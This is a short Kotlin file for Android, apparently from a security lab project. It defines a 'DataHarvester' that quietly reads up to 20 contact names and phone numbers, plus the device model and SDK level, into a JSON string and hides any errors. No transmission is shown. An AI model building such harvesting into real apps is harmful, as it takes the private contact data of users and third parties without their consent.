package com.example.securitylab

import android.content.Context
import android.os.Build
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject

object DataHarvester {
    fun harvestDeviceInfo(context: Context): String {
        val contactsArray = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null, null
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < 20) {
                    contactsArray.put(JSONObject().put("name", it.getString(0) ?: "").put("number", it.getString(1) ?: ""))
                    count++
                }
            }
        } catch (e: Exception) {}

        return JSONObject().apply {
            put("device", Build.MODEL)
            put("sdk", Build.VERSION.SDK_INT)
            put("contacts_sample", contactsArray)
        }.toString()
    }
}
